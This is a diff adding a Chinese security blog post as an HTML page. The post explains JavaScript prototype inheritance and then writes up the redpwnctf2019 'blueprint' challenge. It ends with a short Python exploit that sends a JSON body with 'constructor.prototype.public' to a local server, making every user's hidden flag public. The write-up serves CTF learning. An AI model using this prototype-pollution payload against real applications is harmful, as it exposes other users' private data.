@@ -1,0 +1,879 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>JavaScript原型链污染 | prontosil&#39;s Blog</title>
+  <meta name="keywords" content=" JavaScript ">
+  <meta name="description" content="JavaScript原型链污染 | prontosil&#39;s Blog">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="关于我">
+<meta property="og:type" content="website">
+<meta property="og:title" content="about">
+<meta property="og:url" content="http://prontosil.com/about/index.html">
+<meta property="og:site_name" content="prontosil&#39;s Blog">
+<meta property="og:description" content="关于我">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-01-30T01:19:01.000Z">
+<meta property="article:modified_time" content="2020-01-30T01:20:22.385Z">
+<meta property="article:author" content="prontosil">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.0.1" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-light.css?v=1.0.1" rel="stylesheet">
+
+<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
+<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="/js/jquery.autocomplete.min.js?v=1.0.1" ></script>
+
+<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>
+
+
+<script id="dsq-count-scr" src="//https-prontosil-club.disqus.com/count.js" async></script>
+
+
+<script src="/js/iconfont.js?v=1.0.1" ></script>
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="true">
+  <input class="theme_preload_comment" value="false">
+  <input class="theme_blog_path" value="">
+</div>
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/" class="avatar_target">
+    <img class="avatar" src="/img/avatar.jpg" />
+</a>
+<div class="author">
+    <span>prontosil</span>
+</div>
+
+<div class="icon">
+    
+        
+        <a title="rss" href="/atom.xml" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-rss"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="github" href="https://github.com/xinyongpeng" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-github"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+    
+        
+    
+        
+        <a title="jianshu" href="https://www.jianshu.com/u/7b4cb9cdc0c8" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-jianshu"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="zhihu" href="https://www.zhihu.com/people/he-yan-52-34" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-zhihu"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="csdn" href="https://blog.csdn.net/qq_41645130" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-csdn"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="email" href="mailto:1365155759@qq.com" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-email"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="qq" href="http://wpa.qq.com/msgrd?v=3&uin=1365155759&site=qq&menu=yes" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-qq"></use>
+                </svg>
+            
+        </a>
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li><div class="all active">全部文章<small>(14)</small></div></li>
+    
+        
+            
+            <li><div data-rel="CTF">CTF<small>(4)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="代码审计">代码审计<small>(2)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="生活">生活<small>(1)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="编程">编程<small>(4)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="渗透测试">渗透测试<small>(1)</small></div>
+                
+            </li>
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    
+    
+    
+    </div>
+    <div><a class="about  hasFriend  site_url"  href="/about">关于</a><a style="width: 50%"  class="friends">友链</a></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="14">
+<input type="hidden" id="yelog_site_word_count" value="9k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="back-title-list"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://yelog.org/">叶落阁</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <form onkeydown="if(event.keyCode === 13){return false;}">
+        <input id="local-search-input" class="search" type="text" placeholder="以 in: 开头进行全文搜索" />
+        <i class="cross"></i>
+        <span>
+            <label for="tagswitch">Tags:</label>
+            <input id="tagswitch" type="checkbox" style="display: none" />
+            <i id="tagsWitchIcon"></i>
+        </span>
+    </form>
+    <div class="tags-list">
+    
+    <li class="article-tag-list-item">
+        <a class="color1">JavaScript</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">xxe</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">xml</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">java</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">反序列化</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">php</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">函数</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">文件上传</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">cms</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">域名</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">Linux</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">dig</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">xxd</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">hexdump</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">leetcode</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">汇编</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">dosbox</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">Apache</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">RCE</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">SSI</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">截断</a>
+    </li>
+    
+    <div class="clearfix"></div>
+</div>
+
+    
+    <div id="local-search-result">
+
+    </div>
+    
+    <nav id="title-list-nav">
+        
+        <a  class="CTF "
+           href="/posts/5d5d07b8/"
+           data-tag="JavaScript"
+           data-author="" >
+            <span class="post-title" title="JavaScript原型链污染">JavaScript原型链污染</span>
+            <span class="post-date" title="2020-01-30 09:13:31">2020/01/30</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/posts/2e545689/"
+           data-tag="xxe,xml"
+           data-author="" >
+            <span class="post-title" title="XXE复习">XXE复习</span>
+            <span class="post-date" title="2020-01-30 07:48:51">2020/01/30</span>
+        </a>
+        
+        <a  class="代码审计 "
+           href="/posts/21b61fbe/"
+           data-tag="java,反序列化"
+           data-author="" >
+            <span class="post-title" title="java审计笔记">java审计笔记</span>
+            <span class="post-date" title="2020-01-30 09:05:39">2020/01/30</span>
+        </a>
+        
+        <a  class=""
+           href="/posts/1f38a4f2/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="safeharbor靶机渗透">safeharbor靶机渗透</span>
+            <span class="post-date" title="2020-01-31 19:35:18">2020/01/31</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/posts/3d16ce36/"
+           data-tag="php,函数"
+           data-author="" >
+            <span class="post-title" title="php常用函数">php常用函数</span>
+            <span class="post-date" title="2020-01-30 17:15:35">2020/01/30</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/posts/5877398d/"
+           data-tag="文件上传"
+           data-author="" >
+            <span class="post-title" title="upload-lab做题笔记">upload-lab做题笔记</span>
+            <span class="post-date" title="2020-01-30 21:17:58">2020/01/30</span>
+        </a>
+        
+        <a  class="代码审计 "
+           href="/posts/728b20a1/"
+           data-tag="cms"
+           data-author="" >
+            <span class="post-title" title="代码审计初尝">代码审计初尝</span>
+            <span class="post-date" title="2020-02-01 10:31:26">2020/02/01</span>
+        </a>
+        
+        <a  class="生活 "
+           href="/posts/b69cd839/"
+           data-tag="域名"
+           data-author="" >
+            <span class="post-title" title="域名解析记录">域名解析记录</span>
+            <span class="post-date" title="2020-01-30 10:40:56">2020/01/30</span>
+        </a>
+        
+        <a  class="编程 "
+           href="/posts/f1616294/"
+           data-tag="Linux,dig"
+           data-author="" >
+            <span class="post-title" title="每天一个Linux命令-dig">每天一个Linux命令-dig</span>
+            <span class="post-date" title="2020-01-30 10:45:02">2020/01/30</span>
+        </a>
+        
+        <a  class="编程 "
+           href="/posts/2e8d4a2a/"
+           data-tag="xxd,hexdump"
+           data-author="" >
+            <span class="post-title" title="每天一个Linux命令-xxd">每天一个Linux命令-xxd</span>
+            <span class="post-date" title="2020-01-31 19:35:51">2020/01/31</span>
+        </a>
+        
+        <a  class="编程 "
+           href="/posts/734660ee/"
+           data-tag="leetcode"
+           data-author="" >
+            <span class="post-title" title="每天一道leetcode-数组题">每天一道leetcode-数组题</span>
+            <span class="post-date" title="2020-01-30 10:45:29">2020/01/30</span>
+        </a>
+        
+        <a  class=""
+           href="/posts/2e6a5f8a/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="每天以一道leetcode-链表题">每天以一道leetcode-链表题</span>
+            <span class="post-date" title="2020-01-31 19:35:34">2020/01/31</span>
+        </a>
+        
+        <a  class="编程 "
+           href="/posts/57418b7f/"
+           data-tag="汇编,dosbox"
+           data-author="" >
+            <span class="post-title" title="汇编从入门到入土一">汇编从入门到入土一</span>
+            <span class="post-date" title="2020-02-01 22:02:40">2020/02/01</span>
+        </a>
+        
+        <a  class="渗透测试 "
+           href="/posts/becfc22d/"
+           data-tag="文件上传,Apache,RCE,SSI,截断"
+           data-author="" >
+            <span class="post-title" title="漏洞复现-Apache SSI远程命令执行">漏洞复现-Apache SSI远程命令执行</span>
+            <span class="post-date" title="2020-01-30 10:48:35">2020/01/30</span>
+        </a>
+        
+    </nav>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div class="post">
+    <div class="pjax">
+        <article id="post-JavaScript原型链污染" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">JavaScript原型链污染</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            
+                <a  data-rel="CTF">CTF</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a class="color1">JavaScript</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2020-02-01 22:13:30'>2020-01-30 09:13</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>字数:636</span>
+        
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#JavaScript原型链污染"><span class="toc-text">JavaScript原型链污染</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#如何继承"><span class="toc-text">如何继承</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实例分析"><span class="toc-text">实例分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#redpwnctf2019-blueprint"><span class="toc-text">redpwnctf2019 blueprint</span></a></li></ol></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="JavaScript原型链污染"><a href="#JavaScript原型链污染" class="headerlink" title="JavaScript原型链污染"></a>JavaScript原型链污染</h1><h2 id="如何继承"><a href="#如何继承" class="headerlink" title="如何继承"></a>如何继承</h2><p>比如，现在有一个”动物”对象的构造函数。</p>
+<pre><code class="javascript">function Animal(){
+
+this.species = &quot;动物&quot;;
+
+}</code></pre>
+<p>还有一个”猫”对象的构造函数。</p>
+<pre><code class="JavaScript">function Cat(name,color){
+
+　　　　this.name = name;
+
+　　　　this.color = color;
+
+　　}</code></pre>
+<p>要让<code>Cat</code>这个类去继承<code>Animal</code>类，如果在其他的语言中，一般就是<code>extented</code>即可</p>
+<p>但是在JavaScript中，</p>
+<pre><code class="javascript">Cat.prototype = new Animal();
+
+Cat.prototype.constructor = Cat;
+
+var cat1 = new Cat(&quot;大毛&quot;,&quot;黄色&quot;);
+
+alert(cat1.species); // 动物</code></pre>
+<p>第一行我们直接修改了<code>Cat</code>的<code>prototype</code>属性，让其指向<code>Animal</code></p>
+<p>这一点不难理解，之后所有<code>Cat</code>实例化的对象cat，它的<code>__proto__</code>就会指向<code>Animal</code>(因为<code>Cat.prototype==cat.__proto__</code>)</p>
+<p>但是第二行比较疑惑，<code>Cat.prototype.constructor</code>又代表了什么？</p>
+<p>其实在<code>Cat.prototype</code>中原先是有一个<code>constructor</code>这个属性的，而<code>Cat.prototype.constructor==Cat</code>这个是成立的</p>
+<p>但是我们直接修改了<code>Cat.prototype</code>之后，此时的<code>Cat.prototyep.constructot != Cat</code></p>
+<p>这就比较荒诞了，所以我们要单独修改将这一个属性修改回来</p>
+<h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><h3 id="redpwnctf2019-blueprint"><a href="#redpwnctf2019-blueprint" class="headerlink" title="redpwnctf2019 blueprint"></a>redpwnctf2019 blueprint</h3><p>题目的简要功能就是能够发表文章，并且选择是否公开，传递的数据是json格式的</p>
+<p>每一个用户有一个<code>user_id</code>，第一次访问的时候会通过<code>makeId</code>函数给一个id</p>
+<p><img src="/posts/5d5d07b8/1572246225198.png" alt></p>
+<p>调试的时候发现每个用户创建的时候会将一个<code>(userId,user)</code>存入到一个map中，<code>userId</code>就是之前生成的，而这个<code>user</code>对象中就有flag，也就是说每一个用户都有一个flag</p>
+<p>生成的<code>user</code>对象</p>
+<p><img src="/posts/5d5d07b8/1572246345905.png" alt></p>
+<p>之后会将请求的内容给<code>merge</code>到<code>parsedBody</code>中</p>
+<p>查看<code>defaultsDeep</code>的例子：</p>
+<pre><code>_.defaultsDeep({ &#39;user&#39;: { &#39;name&#39;: &#39;barney&#39; } }, { &#39;user&#39;: { &#39;name&#39;: &#39;fred&#39;, &#39;age&#39;: 36 } });
+// =&gt; { &#39;user&#39;: { &#39;name&#39;: &#39;barney&#39;, &#39;age&#39;: 36 } }</code></pre><p>之后就会将<code>parsedBody</code>中的<code>content</code>和<code>public</code>存放到map中</p>
+<p><img src="/posts/5d5d07b8/1572246569945.png" alt></p>
+<p>之后的功能也不难想了，如果<code>pubic</code>为true就会展示在首页上，如果不为true就会不会展示</p>
+<p>而我们之前提到每一个用户其实都是有一个flag的，只是这个<code>public</code>属性没有进行设置而已。</p>
+<p>思路就是通过原型链污染使得flag能被展示出来</p>
+<p>渲染页面的主要部分如下：</p>
+<pre><code class="javascript">blueprints: Object.entries(user.blueprints).map(([k, v]) =&gt; ({
+  id: k,
+  content: v.content,
+  public: v.public,
+})),</code></pre>
+<p>exp</p>
+<pre><code class="python">import requests
+
+URL = &quot;http://localhost/&quot;
+user_id = &quot;559eb9b06eb8c581b74f33c1202bff50&quot;
+res = requests.post(URL+&quot;make&quot;,cookies={&quot;user_id&quot;:user_id},json={&quot;content&quot;:&quot;aaaa&quot;, &quot;public&quot;:&quot;true&quot;,&quot;constructor&quot;:{&quot;prototype&quot;:{&quot;public&quot;:&quot;true&quot;}}})
+print(res.text)
+
+
+res2 = requests.get(URL, cookies={&quot;user_id&quot;:user_id})
+print(res2.text)</code></pre>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论 </span>
+    </div>
+</article>
+
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>JavaScript原型链污染</p>
+    <p><span class="copy-title">文章字数:</span><span class="post-count">636</span></p>
+    <p><span class="copy-title">本文作者:</span><a  title="prontosil">prontosil</a></p>
+    <p><span class="copy-title">发布时间:</span>2020-01-30, 09:13:31</p>
+    <p><span class="copy-title">最后更新:</span>2020-02-01, 22:13:30</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/5d5d07b8/" title="JavaScript原型链污染">http://prontosil.com/posts/5d5d07b8/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
+    <section id="comments" class="disqus">
+    <style> aside.comment-bar { margin: auto 30px; }</style>
+    <div id="disqus_thread"></div>
+    <script>
+        var disqus_config = function(){
+            this.page.url = 'http://prontosil.com/posts/5d5d07b8/';
+            this.page.identifier = 'posts/5d5d07b8/';
+        };
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = '//https-prontosil-club.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        }
+    </script>
+    
+    <aside class="comment-bar">
+        <a>
+            <i class="fa fa-commenting-o animated infinite pulse"></i>
+            <i class="fa fa-spinner fa-pulse"></i>
+            <span class="count-comment"></span>
+        </a>
+    </aside>
+    <script>
+        var isLoadComments = false;
+        var $commentBar = $("#comments aside.comment-bar");
+        var load$hide = function(){
+            if(isLoadComments){
+                return;
+            }
+            isLoadComments = true;
+            if(isLoadComments )
+            $commentBar.find("a > i").toggle();
+            loadComment();
+            $commentBar.fadeOut(800);
+        }
+        $commentBar.click(function(){
+            load$hide();
+        })
+        $commentBar.children("a").mouseenter(function(){
+            load$hide();
+        })
+    </script>
+
+
+</section>
+
+<!-- Add comment count-->
+<span class="disqus-comment-count" style="display: none" data-disqus-identifier="posts/5d5d07b8/"></span>
+<span class="disqus-comment-count" style="display: none" data-disqus-url="http://prontosil.com/posts/5d5d07b8/"></span>
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">©2016-2020 prontosil</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full"><span class="min "></span></button>
+<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
+<div class="post-toc"><span class="post-toc-title">目录</span>
+    <div class="post-toc-content">
+
+    </div>
+</div>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+<div class="acParent"></div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.0.1" ></script>
+
+<script src="/js/script.js?v=1.0.1" ></script>
+<script>
+    var img_resize = 'default';
+    /*作者、标签的自动补全*/
+    $(function () {
+        $('.search').AutoComplete({
+            'data': ['#JavaScript','#xxe','#xml','#java','#反序列化','#php','#函数','#文件上传','#cms','#域名','#Linux','#dig','#xxd','#hexdump','#leetcode','#汇编','#dosbox','#Apache','#RCE','#SSI','#截断',],
+            'itemHeight': 20,
+            'width': 418
+        }).AutoComplete('show');
+    })
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $(".post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+        $('pre code').each(function(){
+            var lines = $(this).text().split('\n').length - 1, widther='';
+            if (lines>99) {
+                widther = 'widther'
+            }
+            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
+            $(this).addClass('has-numbering ' + widther)
+                    .parent()
+                    .append($numbering);
+            for(var i=1;i<=lines;i++){
+                $numbering.append($('<li/>').text(i));
+            }
+        });
+        
+
+        /*访问数量*/
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<style>
+    pre{
+        position: relative;
+        margin-bottom: 24px;
+        border-radius: 10px;
+        border: 1px solid #e2dede;
+        background: #FFF;
+        overflow: hidden;
+    }
+    code.has-numbering{
+        margin-left: 30px;
+    }
+    code.has-numbering.widther{
+        margin-left: 35px;
+    }
+    .pre-numbering{
+        margin: 0px;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 20px;
+        padding: 0.5em 3px 0.7em 5px;
+        border-right: 1px solid #C3CCD0;
+        text-align: right;
+        color: #AAA;
+        background-color: #fafafa;
+    }
+    .pre-numbering.widther {
+        width: 35px;
+    }
+</style>
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+        .nav .hide-list.fullscreen {
+            left: 492px
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("https://i.loli.net/2019/07/22/5d3521411f3f169375.png");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
